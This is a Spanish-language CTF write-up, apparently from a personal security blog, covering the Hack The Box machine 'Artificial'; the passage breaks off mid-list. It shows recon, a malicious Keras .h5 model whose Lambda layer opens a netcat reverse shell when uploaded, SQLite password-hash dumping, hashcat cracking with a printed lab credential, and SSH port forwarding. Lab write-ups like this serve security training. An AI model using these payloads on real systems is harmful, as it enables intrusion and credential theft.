<!DOCTYPE html><!-- Layout especÃ­fico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/contact.fBeTOWmP.css">
<link rel="stylesheet" href="/assets/contact.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si estÃ¡ disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-5xl mx-auto px-6 py-12"> <!-- ENCABEZADO --> <div class="mb-14 text-center"> <a href="/writeups" class="text-sm text-slate-400 hover:text-accentBlue transition-colors block mb-4">
â† Volver a Writeups
</a> <h1 class="text-5xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Artificial Hack The Box </h1> <p class="text-slate-400 text-sm mb-2">10 de septiembre de 2025</p> <p class="text-lg text-slate-300 max-w-2xl mx-auto mb-6 leading-relaxed"> Artificial es una mÃ¡quina Linux de dificultad fÃ¡cil que muestra cÃ³mo explotar una aplicaciÃ³n web utilizada para ejecutar modelos de IA con Tensorflow y la interfaz de usuario web Backrest abusando de las funcionalidades de copia de seguridad y restauraciÃ³n y de la utilidad restic utilizada por la aplicaciÃ³n. </p> </div> <!-- BLOQUE DE INFORMACIÃ“N TÃ‰CNICA --> <section class="grid md:grid-cols-2 gap-6 mb-12 text-sm"> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentBlue text-lg font-semibold mb-3">Detalles TÃ©cnicos</h2> <ul class="space-y-2 text-slate-300">    <li><strong>Dificultad:</strong> Easy</li> </ul> </div> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentGreen text-lg font-semibold mb-3">Etiquetas y TecnologÃ­a</h2> <div class="flex flex-wrap gap-2"> <span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> nmap </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> gobuster </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> ssh </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> sudo -l </span> </div> </div> </section> <!-- IMAGEN DESTACADA -->  <div class="prose-writeup"> <p><img src="/img/arificial.png" alt="Banner SoulMate"></p>
<h3 id="-escaneo-y-enumeraciÃ³n">ğŸ” Escaneo y EnumeraciÃ³n</h3>
<h4 id="-escaneos">ğŸ“Œ Escaneos</h4>
<ul>
<li>Escanear y Exportar resultados:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nmap</span><span style="color:#BD93F9"> -sSCV</span><span style="color:#BD93F9"> -p-</span><span style="color:#BD93F9"> --open</span><span style="color:#BD93F9"> -T4</span><span style="color:#BD93F9"> -Pn</span><span style="color:#BD93F9"> -n</span><span style="color:#BD93F9"> -vvv</span><span style="color:#BD93F9"> -oN</span><span style="color:#F1FA8C"> escaneo_nmap.txt</span><span style="color:#BD93F9"> -oX</span><span style="color:#F1FA8C"> escaneo_nmap.xml</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span></code></pre>
<hr>
<h4 id="ï¸-puertos-y-servicios-descubiertos">ğŸ› ï¸ Puertos y Servicios Descubiertos</h4>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">PORT</span><span style="color:#F1FA8C">   STATE</span><span style="color:#F1FA8C"> SERVICE</span><span style="color:#F1FA8C"> REASON</span><span style="color:#F1FA8C">         VERSION</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">22/tcp</span><span style="color:#F1FA8C"> open</span><span style="color:#F1FA8C">  ssh</span><span style="color:#F1FA8C">     syn-ack</span><span style="color:#F1FA8C"> ttl</span><span style="color:#BD93F9"> 63</span><span style="color:#F1FA8C"> OpenSSH</span><span style="color:#F1FA8C"> 8.2p1</span><span style="color:#F1FA8C"> Ubuntu</span><span style="color:#F1FA8C"> 4ubuntu0.13</span><span style="color:#F8F8F2"> (Ubuntu </span><span style="color:#F1FA8C">Linux</span><span style="color:#F8F8F2">; </span><span style="color:#50FA7B">protocol</span><span style="color:#BD93F9"> 2.0</span><span style="color:#F8F8F2">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">80/tcp</span><span style="color:#F1FA8C"> open</span><span style="color:#F1FA8C">  http</span><span style="color:#F1FA8C">    syn-ack</span><span style="color:#F1FA8C"> ttl</span><span style="color:#BD93F9"> 63</span><span style="color:#F1FA8C"> nginx</span><span style="color:#BD93F9"> 1.18.0</span><span style="color:#F8F8F2"> (Ubuntu)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">|</span><span style="color:#50FA7B"> http-methods:</span><span style="color:#F8F8F2"> </span></span>
<span class="line"><span style="color:#FF79C6">|</span><span style="color:#50FA7B">_</span><span style="color:#F1FA8C">  Supported</span><span style="color:#F1FA8C"> Methods:</span><span style="color:#F1FA8C"> GET</span><span style="color:#F1FA8C"> HEAD</span><span style="color:#F1FA8C"> POST</span><span style="color:#F1FA8C"> OPTIONS</span></span>
<span class="line"><span style="color:#FF79C6">|</span><span style="color:#50FA7B">_http-title:</span><span style="color:#F1FA8C"> Did</span><span style="color:#F1FA8C"> not</span><span style="color:#F1FA8C"> follow</span><span style="color:#F1FA8C"> redirect</span><span style="color:#F1FA8C"> to</span><span style="color:#F1FA8C"> http://artificial.htb/</span></span>
<span class="line"><span style="color:#FF79C6">|</span><span style="color:#50FA7B">_http-server-header:</span><span style="color:#F1FA8C"> nginx/1.18.0</span><span style="color:#F8F8F2"> (Ubuntu)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">Service</span><span style="color:#F1FA8C"> Info:</span><span style="color:#F1FA8C"> OS:</span><span style="color:#F1FA8C"> Linux</span><span style="color:#F8F8F2">; </span><span style="color:#50FA7B">CPE:</span><span style="color:#F1FA8C"> cpe:/o:linux:linux_kernel</span></span>
<span class="line"></span></code></pre>
<ul>
<li>WhatWeb:<br></li>
</ul>
<p>HTTP Server Ubuntu Linux nginx/1.18.0 (Ubuntu),Title Artificial -AI Solutions, nginx 1.18.0</p>
<hr>
<h4 id="-enumeraciÃ³n-web">ğŸŒ EnumeraciÃ³n Web</h4>
<ul>
<li><strong>EnumeraciÃ³n de directorios:</strong></li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> dir</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span><span style="color:#BD93F9"> -t</span><span style="color:#BD93F9"> 50</span><span style="color:#BD93F9"> -b</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">NO-STATU</span><span style="color:#F8F8F2">S</span><span style="color:#FF79C6">></span></span></code></pre>
<hr>
<h4 id="-hallazgos">ğŸ“‚ Hallazgos</h4>
<ul>
<li>Web:</li>
</ul>
<p>/home <br>
/login <br>
/dashboard</p>
<p><strong>En la pagina login nos debemos registrar y con esas credenciales ingresar al dashboard.</strong></p>
<hr>
<ul>
<li>
<p>TecnologÃ­as: <strong>Nginx 1.18.0</strong></p>
</li>
<li>
<p>Recurso accesibles descargables: <strong>requerimients.txt y Dockerfile</strong></p>
</li>
<li>
<p>Contenido Archivos:</p>
</li>
</ul>
<p><strong>requerimients.txt:</strong></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#BD93F9">tensorflow-cpu</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">=2.13.1</span></span></code></pre>
<p><strong>Dockerfile:</strong></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">FROM</span><span style="color:#F1FA8C"> python:3.8-slim</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">WORKDIR</span><span style="color:#F1FA8C"> /code</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">RUN</span><span style="color:#F1FA8C"> apt-get</span><span style="color:#F1FA8C"> update</span><span style="color:#F8F8F2"> &#x26;&#x26; </span><span style="color:#FF79C6">\</span></span>
<span class="line"><span style="color:#50FA7B">    apt-get</span><span style="color:#F1FA8C"> install</span><span style="color:#BD93F9"> -y</span><span style="color:#F1FA8C"> curl</span><span style="color:#F8F8F2"> &#x26;&#x26; </span><span style="color:#FF79C6">\</span></span>
<span class="line"><span style="color:#50FA7B">    curl</span><span style="color:#BD93F9"> -k</span><span style="color:#BD93F9"> -LO</span><span style="color:#F1FA8C"> https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl</span><span style="color:#F8F8F2"> &#x26;&#x26; </span><span style="color:#FF79C6">\</span></span>
<span class="line"><span style="color:#50FA7B">    rm</span><span style="color:#BD93F9"> -rf</span><span style="color:#F1FA8C"> /var/lib/apt/lists/</span><span style="color:#BD93F9;font-style:italic">*</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">RUN</span><span style="color:#F1FA8C"> pip</span><span style="color:#F1FA8C"> install</span><span style="color:#F1FA8C"> ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">ENTRYPOINT</span><span style="color:#F8F8F2"> [</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">/bin/bash</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">]</span></span></code></pre>
<hr>
<h2 id="-explotaciÃ³n">ğŸ’¥ ExplotaciÃ³n</h2>
<ul>
<li>
<p>Servicio: <code>Web</code></p>
</li>
<li>
<p>MÃ©todo: <code>Inyeccion de comandos</code></p>
</li>
<li>
<p>Resultado (shell/flag): <code>shell</code></p>
</li>
</ul>
<h3 id="configuraciÃ³n-de-un-entorno-docker-para-el-exploit-de-tensorflow">ConfiguraciÃ³n de un entorno Docker para el exploit de TensorFlow</h3>
<ul>
<li>Se descargaron <code>requirements.txt</code> y <code>Dockerfile</code> .<br></li>
<li>Antes de crear el entorno Docker para el exploit, creÃ© un script de carga Ãºtil en el mismo directorio.</li>
</ul>
<p><strong>Paso 1: Crear el script de carga Ãºtil</strong></p>
<p>En miÂ <code>Downloads</code>carpeta, creÃ© un archivo llamadoÂ <code>exploit.py</code>. Este script contiene mi carga Ãºtil de TensorFlow:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">import</span><span style="color:#F1FA8C"> tensorflow</span><span style="color:#F1FA8C"> as</span><span style="color:#F1FA8C"> tf</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">def</span><span style="color:#F1FA8C"> exploit</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">x</span><span style="color:#F8F8F2">)</span><span style="color:#F1FA8C">:</span></span>
<span class="line"><span style="color:#50FA7B">    import</span><span style="color:#F1FA8C"> os</span></span>
<span class="line"><span style="color:#50FA7B">    os.system(</span><span style="color:#50FA7B">"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&#x26;1|nc &#x3C;MY-IP> 4444 >/tmp/f"</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#FF79C6">    return</span><span style="color:#F1FA8C"> x</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">model</span><span style="color:#F1FA8C"> =</span><span style="color:#F1FA8C"> tf.keras.Sequential</span><span style="color:#F8F8F2">()</span></span>
<span class="line"><span style="color:#50FA7B">model.add(tf.keras.layers.Input(shape</span><span style="color:#F1FA8C">=</span><span style="color:#F8F8F2">(</span><span style="color:#F1FA8C">64,</span><span style="color:#F8F8F2">)))</span></span>
<span class="line"><span style="color:#50FA7B">model.add(tf.keras.layers.Lambda(exploit</span><span style="color:#F8F8F2">))</span></span>
<span class="line"><span style="color:#50FA7B">model.compile</span><span style="color:#F8F8F2">()</span></span>
<span class="line"><span style="color:#50FA7B">model.save(</span><span style="color:#50FA7B">"exploit.h5"</span><span style="color:#F8F8F2">)</span></span></code></pre>
<p><strong>Paso 2: Construir la imagen de Docker</strong></p>
<ul>
<li>Luego abrÃ­ una terminal en laÂ <code>Downloads</code>carpeta y ejecutÃ©:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> docker</span><span style="color:#F1FA8C"> build</span><span style="color:#BD93F9"> -t</span><span style="color:#F1FA8C"> artificial-exploit</span><span style="color:#F1FA8C"> .</span></span></code></pre>
<ul>
<li>Esto creÃ³ una imagen de Docker con Python 3.8 y TensorFlow 2.13.1 instalados, que coincidÃ­a con el entorno de destino.</li>
</ul>
<p><strong>Paso 3: Ejecute el contenedor Docker con un volumen compartido</strong></p>
<ul>
<li>Para asegurar que el archivo de carga Ãºtil apareciera en mi sistema host, ejecutÃ©:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> docker</span><span style="color:#F1FA8C"> run</span><span style="color:#BD93F9"> -it</span><span style="color:#BD93F9"> -v</span><span style="color:#F8F8F2"> $(</span><span style="color:#8BE9FD">pwd</span><span style="color:#F8F8F2">)</span><span style="color:#F1FA8C">:/app</span><span style="color:#F1FA8C"> artificial-exploit</span></span></code></pre>
<ul>
<li>
<p><code>$(pwd)</code>asigna la carpeta del host actual alÂ <code>/app</code>interior del contenedor.</p>
</li>
<li>
<p>Cualquier archivo guardadoÂ <code>/app</code>dentro del contenedor aparece automÃ¡ticamente en el host.</p>
</li>
</ul>
<p><strong>Paso 4: Generar la carga Ãºtil dentro de Docker</strong></p>
<ul>
<li>Dentro del contenedor, naveguÃ©Â <code>/app</code>y ejecutÃ© el script:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8BE9FD">cd</span><span style="color:#F1FA8C"> /app</span><span style="color:#F8F8F2">   </span></span>
<span class="line"><span style="color:#50FA7B">python3</span><span style="color:#F1FA8C"> exploit.py</span></span></code></pre>
<ul>
<li>El archivoÂ <code>exploit.h5</code>se generÃ³Â y tambiÃ©n apareciÃ³ <code>/app</code> en mi carpeta de host.</li>
</ul>
<p><strong>Paso 5: Iniciar un receptor para el shell inverso</strong></p>
<ul>
<li>En mi mÃ¡quina local, iniciÃ© un escucha netcat para capturar el shell inverso:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nc</span><span style="color:#BD93F9">  -nlvp</span><span style="color:#BD93F9">  4444</span></span></code></pre>
<p><strong>Paso 6: Subir la carga Ãºtil a la Web</strong></p>
<ul>
<li>
<p>Vaya al panel de control (Dashboard), seleccione elÂ archivo <code>exploit.h5</code> y cargue el modelo. DespuÃ©s de cargarlo, ejecute la carga Ãºtil haciendo clic en â€Â <strong>Ver prediccionesâ€</strong>Â .</p>
</li>
<li>
<p>Una vez que el modelo se ejecutÃ³ en el servidor web, mi oyente captÃ³ exitosamente la conexiÃ³n, dÃ¡ndome un shell, en este momento podemos mejorar la TTY si lo deseamos.</p>
</li>
</ul>
<h3 id="ganando-usuarios">Ganando usuarios</h3>
<ul>
<li>
<p>Al iniciar mi shell comoÂ usuario <code>app</code>, mi primer instinto fueÂ <strong>enumerar el directorio de la aplicaciÃ³n</strong>Â .</p>
</li>
<li>
<p>EjecutÃ©:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ls</span><span style="color:#BD93F9"> -la</span></span></code></pre>
<ul>
<li>
<p>Una carpeta llamadaÂ <code>instance</code>y un archivo llamadoÂ <code>users.db</code>.</p>
</li>
<li>
<p>EsaÂ <code>.db</code>extensiÃ³nÂ me recordÃ³Â <strong>a SQLite .</strong></p>
</li>
<li>
<p>Dado que Flask (y muchas aplicaciones web de Python) a menudo almacenan sus datos en una base de datos SQLite dentro de unaÂ <code>instance/</code>carpeta, esto me hizo sospechar que podÃ­a volcar las credenciales de usuario directamente desde allÃ­.</p>
</li>
<li>
<p>ConfirmÃ© mi presentimiento al ejecutar:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">file</span><span style="color:#F1FA8C"> instance/users.db</span></span></code></pre>
<ul>
<li>
<p>RegresÃ³Â <code>SQLite 3.x database</code>. Â¡Bingo! Definitivamente SQLite.</p>
</li>
<li>
<p>Desde allÃ­, quise comprobar quÃ© tablas existÃ­an, asÃ­ que lo abrÃ­ directamente:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">sqlite3</span><span style="color:#F1FA8C"> instance/users.db</span></span></code></pre>
<ul>
<li>Una vez en el shell de SQLite, enumerÃ© todas las tablas:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">.tables</span></span></code></pre>
<ul>
<li>Existen dos tablas:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">model</span><span style="color:#F1FA8C">  user</span></span></code></pre>
<ul>
<li>LaÂ tabla <code>user</code> me llamÃ³ la atenciÃ³n de inmediato. InspeccionÃ© su esquema:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">PRAGMA</span><span style="color:#F1FA8C"> table_info</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">user</span><span style="color:#F8F8F2">);</span></span></code></pre>
<ul>
<li>
<p>Devuelve la informaciÃ³n de las columnas de la tabla <code>user</code> en SQLite.</p>
</li>
<li>
<p>El comando <code>PRAGMA table_info(nombre_tabla);</code> lista:</p>
</li>
</ul>
<hr>
<ol>
<li>
<p><strong>cid</strong> â†’ Ã­ndice de la columna (empieza en 0).</p>
</li>
<li>
<p><strong>name</strong> â†’ nombre de la columna.</p>
</li>
<li>
<p><strong>type</strong> â†’ tipo de dato declarado (ej. <code>TEXT</code>, <code>INTEGER</code>).</p>
</li>
<li>
<p><strong>notnull</strong> â†’ 1 si la columna es <code>NOT NULL</code>, 0 si permite nulos.</p>
</li>
<li>
<p><strong>dflt_value</strong> â†’ valor por defecto de la columna.</p>
</li>
<li>
<p><strong>pk</strong> â†’ 1 si forma parte de la clave primaria, 0 en caso contrario.</p>
</li>
</ol>
<hr>
<ul>
<li>
<p>Esto mostrÃ³ campos paraÂ <code>id</code>,Â <code>username</code>,Â <code>email</code>, yÂ <code>password</code>.</p>
</li>
<li>
<p>El paso final fue volcar el contenido:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">SELECT</span><span style="color:#BD93F9;font-style:italic"> *</span><span style="color:#F1FA8C"> FROM</span><span style="color:#F1FA8C"> user</span><span style="color:#F8F8F2">;</span></span></code></pre>
<ul>
<li>Y asÃ­, tuveÂ <strong>todos los nombres de usuario, correos electrÃ³nicos y contraseÃ±as cifradas</strong>Â para cada cuenta en la aplicaciÃ³n.</li>
</ul>
<h3 id="volcado-y-descifrado-de-hashes-de-contraseÃ±as">Volcado y descifrado de hashes de contraseÃ±as</h3>
<ul>
<li>Desde mi shell, volquÃ© los hashes de contraseÃ±a almacenados directamente desde la base de datos (luego de salir del indicador de SQLite conÂ <code>.quit</code>si es necesario) a un archivo hash.txt:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">sqlite3</span><span style="color:#F1FA8C"> instance/users.db</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">SELECT password FROM user;</span><span style="color:#E9F284">"</span></span></code></pre>
<ul>
<li>Con los hashes guardados, usÃ©Â <strong>Hashcat</strong>Â en mi mÃ¡quina atacante para descifrarlos con laÂ <code>rockyou.txt</code>lista de palabras:</li>
</ul>
<h3 id="credenciales-descifradas">Credenciales descifradas</h3>
<ul>
<li>
<p>Al ejecutar Hashcat contra laÂ <code>rockyou.txt</code>lista de palabras se revelaron rÃ¡pidamente dos credenciales vÃ¡lidas:</p>
</li>
<li>
<p>Credenciales Encontradas (utiles):</p>
<p><strong>gael:mattp005numbertwo</strong></p>
</li>
<li>
<p>Probablemente se trataba de cuentas de usuario reales en el sistema objetivo. Con esta informaciÃ³n, mi siguiente paso fue intentarÂ <strong>iniciar sesiÃ³n por SSH</strong>Â para comprobar si alguna de las cuentas tenÃ­a privilegios de acceso remoto.</p>
</li>
</ul>
<hr>
<h3 id="ï¸-escalada">ğŸ›¡ï¸ Escalada</h3>
<ul>
<li>
<p>MÃ©todo: <code>Pivoting, Reastic abuse privilege</code></p>
</li>
<li>
<p>Nivel de Acceso: <code>root</code></p>
</li>
</ul>
<hr>
<h3 id="movimiento-lateral-a-travÃ©s-de-ssh">Movimiento lateral a travÃ©s de SSH</h3>
<ul>
<li>
<p>Con las credenciales descifradas en la mano, comencÃ© a probar el acceso SSH desde mi mÃ¡quina atacante:</p>
</li>
<li>
<p>Ingresamos con el usuario gael y su credencial.</p>
</li>
</ul>
<h3 id="bandera-user">Bandera user:</h3>
<ul>
<li>BusquÃ© elÂ <code>user.txt</code>archivo en el sistema ejecutando:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">find</span><span style="color:#F1FA8C"> /</span><span style="color:#BD93F9"> -type</span><span style="color:#F1FA8C"> f</span><span style="color:#BD93F9"> -name</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">user.txt</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> 2></span><span style="color:#F1FA8C">/dev/null</span></span></code></pre>
<ul>
<li>DevolviÃ³ la ruta:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">/home/gael/user.txt</span></span></code></pre>
<ul>
<li>DespuÃ©s de eso, realicÃ© una enumeraciÃ³n rÃ¡pida para recopilar informaciÃ³n del sistema y buscar posibles rutas de escalada de privilegios:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">id</span></span>
<span class="line"><span style="color:#50FA7B">whoami</span></span>
<span class="line"><span style="color:#50FA7B">hostnamectl</span><span style="color:#F8F8F2">   </span></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#BD93F9"> -l</span><span style="color:#F8F8F2">   </span></span>
<span class="line"><span style="color:#50FA7B">ss</span><span style="color:#BD93F9"> -tulnp</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> grep</span><span style="color:#F1FA8C"> LISTEN</span><span style="color:#F8F8F2">   </span></span>
<span class="line"><span style="color:#50FA7B">ls</span><span style="color:#BD93F9"> -la</span><span style="color:#F1FA8C"> /var/backups</span></span></code></pre>
<p>Recomendaciones:</p>
<ul>
<li>
<p><code>gael</code><strong>no</strong>Â eraÂ un usuario sudo.</p>
</li>
<li>
<p>ExistÃ­a un archivo de respaldo enÂ <code>/var/backups/backrest_backup.tar.gz</code>.</p>
</li>
<li>
<p>Un servicio interno estaba escuchando enÂ <code>127.0.0.1:9898</code>.</p>
</li>
<li>
<p>decidi copiar el archivo backrest_backup.tar.gz a mi maquina y descomprimirla.</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">scp</span><span style="color:#F1FA8C"> gael@10.10.11.74:/var/backups/backrest_backup.tar.gz</span><span style="color:#F1FA8C"> .</span></span></code></pre>
<ul>
<li>
<p>El archivoÂ <code>backrest_backup.tar.gz</code>resultÃ³ ser un archivo TAR simple, no comprimido con GZIP:</p>
</li>
<li>
<p>Al buscar los archivos extraÃ­dos, encontrÃ© un archivo de configuraciÃ³n. Lo revisÃ©Â <code>config.json</code>y encontrÃ© una contraseÃ±a codificada con bcrypt. Tras extraer el hash, lo guardÃ© en un archivo:</p>
</li>
</ul>
<p>Luego usÃ©Â <strong>Hashcat</strong>Â con laÂ <code>rockyou.txt</code>lista de palabras para descifrarlo:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">hashcat</span><span style="color:#BD93F9"> -m</span><span style="color:#BD93F9"> 3200</span><span style="color:#F1FA8C"> /tmp/bcrypt.hash</span><span style="color:#F1FA8C"> /usr/share/wordlists/rockyou.txt</span><span style="color:#BD93F9"> --force</span></span></code></pre>
<ul>
<li>Resultado:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">CENSURED</span></span></code></pre>
<h3 id="pivotando-hacia-el-servicio-interno">Pivotando hacia el Servicio Interno</h3>
<ul>
<li>Estas credenciales pertenecÃ­an a unaÂ <strong>cuenta de administrador</strong>Â de un servicio web local que se ejecutaba en el puertoÂ <code>9898</code>. Las redirigÃ­ a mi mÃ¡quina:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ssh</span><span style="color:#BD93F9"> -L</span><span style="color:#F1FA8C"> 9898:127.0.0.1:9898</span><span style="color:#F1FA8C"> gael@10.10.11.74</span></span></code></pre>
<ul>
<li>
